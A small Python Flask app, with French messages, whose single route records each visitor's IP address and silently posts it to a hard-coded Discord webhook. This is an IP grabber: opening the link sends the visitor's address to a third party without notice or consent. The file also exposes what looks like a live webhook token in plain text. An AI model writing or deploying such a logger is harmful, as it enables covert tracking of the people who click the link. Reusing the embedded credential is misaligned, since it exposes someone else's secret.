from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1550941768952844418/wMfHfY4Q3-OStrMILnaB1XkRjURjERSVoDlP4pKLHooJ8Tk8mSRUmwL-bnW3gIyzCbc0"

@app.route('/com')
def executer_script():
    ip = request.remote_addr

    print("IP du client :", ip)

    requests.post(WEBHOOK_URL, json={
        "content": f"Nouvelle IP : {ip}"
    })

    print("Le script s'est exécuté !")

    return "Script exécuté avec succès !"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)